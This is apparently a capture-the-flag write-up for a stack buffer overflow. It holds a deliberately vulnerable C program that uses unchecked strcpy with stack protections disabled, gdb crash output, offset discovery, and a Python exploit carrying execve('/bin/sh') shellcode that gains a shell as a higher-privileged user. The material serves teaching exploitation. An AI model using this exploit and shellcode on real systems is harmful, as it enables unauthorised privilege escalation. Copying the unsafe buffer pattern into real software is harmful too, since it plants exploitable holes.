// gcc pwnme.c -o pwnme -fno-stack-protector -z execstack

#include < stdio.h >
#include < stdlib.h >
#include < string.h >

int main(int argc, char*argv[])
{
    char buffer[256];

    if (argc < 2) {
        perror("Usage: ./pwnme twitt\n");
        return 1;
    }

    strcpy(buffer, argv[1]);
    printf("%s", buffer);

    return 0;
}

// rootλkali:➜ ~ # pattern_create 300
// Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

// pwn4@binary-challenges-pwnerrank-com:~$ gdb ./pwnme
// (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
// Starting program: /home/pwn4/pwnme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
//  _____                           _____             _
// |  __ \                         |  __ \           | |
// | |__) |_      ___ __   ___ _ __| |__) |__ _ _ __ | | __
// |  ___/\ \ /\ / / '_ \ / _ \ '__|  _  // _` | '_ \| |/ /
// | |     \ V  V /| | | |  __/ |  | | \ \ (_| | | | |   <
// |_|      \_/\_/ |_| |_|\___|_|  |_|  \_\__,_|_| |_|_|\_\

// Program received signal SIGSEGV, Segmentation fault.
// 0x6a413969 in ?? ()

// rootλkali:➜ ~ # pattern_offset 0x6a413969
// [*] Exact match at offset 268

// (gdb) r `python -c 'print "A"*268 + "B"*4'`
// Starting program: /home/pwn4/pwnme `python -c 'print "A"*268 + "B"*4'`
//  _____                           _____             _
// |  __ \                         |  __ \           | |
// | |__) |_      ___ __   ___ _ __| |__) |__ _ _ __ | | __
// |  ___/\ \ /\ / / '_ \ / _ \ '__|  _  // _` | '_ \| |/ /
// | |     \ V  V /| | | |  __/ |  | | \ \ (_| | | | |   <
// |_|      \_/\_/ |_| |_|\___|_|  |_|  \_\__,_|_| |_|_|\_\

// Program received signal SIGSEGV, Segmentation fault.
// 0x42424242 in ?? ()

// (gdb) i r
// esp            0xffffd5f0       0xffffd5f0

// #!/usr/bin/env python
// import struct
// from subprocess import call

// #Stack address where shellcode is copied.
// ret_addr = 0xffffd5f0

// #Spawn a shell
// #execve(/bin/sh)
// scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

// #endianess convertion
// def conv(num):
//  return struct.pack("<I",num)

// # buf = Junk + RA + NOP's + Shellcode
// buf = "A" * 268
// buf += conv(ret_addr)
// buf += "\x90" * 100
// buf += scode

// print "Calling vulnerable program"
// call(["/home/pwn4/pwnme", buf])

// pwn4@binary-challenges-pwnerrank-com:~$ python /tmp/exp4.py
// Calling vulnerable program
//  _____                           _____             _
// |  __ \                         |  __ \           | |
// | |__) |_      ___ __   ___ _ __| |__) |__ _ _ __ | | __
// |  ___/\ \ /\ / / '_ \ / _ \ '__|  _  // _` | '_ \| |/ /
// | |     \ V  V /| | | |  __/ |  | | \ \ (_| | | | |   <
// |_|      \_/\_/ |_| |_|\___|_|  |_|  \_\__,_|_| |_|_|\_\
// $ id
// uid=1012(pwn4) gid=1012(pwn4) euid=1013(pwn4pwn) groups=1012(pwn4)
// $ cat .flag